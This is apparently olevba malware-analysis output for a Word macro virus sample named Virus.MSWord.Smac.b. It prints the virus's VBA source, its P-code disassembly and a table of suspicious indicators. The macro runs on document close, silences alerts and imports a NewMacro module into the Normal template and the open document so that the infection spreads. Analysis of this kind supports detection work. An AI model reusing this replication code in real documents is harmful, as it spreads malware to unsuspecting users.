olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Smac.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Smac.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Macro_Run.bas 
in file: Virus.MSWord.Smac.b - OLE stream: 'Macros/VBA/Macro_Run'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Application.DisplayAlerts = wdAlertsNone
Pad = Options.DefaultFilePath(wdDocumentsPath)
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "NewMacro" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "NewMacro" Then ActiveInstall = True
Next I
If ActiveInstall = True And NormInstall = True Then GoTo Label_Exit
If NormInstall = False Then
NormalTemplate.VBProject.VBComponents.Import Pad + ("/NewMacro.txt")
NormalTemplate.Save
Else
Dname = ActiveDocument.FullName
If Left$(Dname, 8) = "Document" Then GoTo Label_Exit
ActiveDocument.VBProject.VBComponents.Import Pad + ("/NewMacro.txt")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End If
Label_Exit:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Smac.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1182 bytes
' Macros/VBA/Macro_Run - 1977 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #3:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Pad 
' Line #4:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #5:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "NewMacro"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #6:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #7:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #8:
' 	Ld I 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "NewMacro"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActiveInstall 
' 	EndIf 
' Line #9:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #10:
' 	Ld ActiveInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #11:
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #12:
' 	Ld Pad 
' 	LitStr 0x000D "/NewMacro.txt"
' 	Paren 
' 	Add 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #13:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St Dname 
' Line #16:
' 	Ld Dname 
' 	LitDI2 0x0008 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0008 "Document"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #17:
' 	Ld Pad 
' 	LitStr 0x000D "/NewMacro.txt"
' 	Paren 
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #18:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Label Label_Exit 
' Line #21:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

